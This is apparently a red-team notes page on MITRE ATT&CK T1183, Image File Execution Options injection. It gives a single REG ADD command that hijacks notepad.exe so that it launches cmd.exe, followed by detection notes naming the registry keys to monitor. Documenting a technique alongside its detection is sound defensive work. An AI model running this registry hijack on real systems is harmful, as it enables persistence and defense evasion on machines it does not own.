---
description: 'Defense Evasion, Persistence, Privilege Escalation'
---

# T1183: Image File Execution Options Injection

## Execution

{% code-tabs %}
{% code-tabs-item title="attacker@victim" %}
```csharp
REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe" /v Debugger /d "cmd.exe"
```
{% endcode-tabs-item %}
{% endcode-tabs %}

Launching a notepad on the victim system:

![](../.gitbook/assets/ifeo-notepad.png)

![](../.gitbook/assets/ifeo-notepad2.png)

## Observations

Monitoring commandline arguments and events modifying registry keys: `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options/<executable>` and `HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\<executable>` should be helpful in detecting these manipulations:

![](../.gitbook/assets/ifeo-cmdline.png)

![](../.gitbook/assets/ifeo-cmdline2.png)

{% embed url="https://attack.mitre.org/wiki/Technique/T1183" %}

{% embed url="https://blogs.msdn.microsoft.com/mithuns/2010/03/24/image-file-execution-options-ifeo/" %}

{% embed url="https://blogs.msdn.microsoft.com/reiley/2011/07/29/a-debugging-approach-to-ifeo/" %}

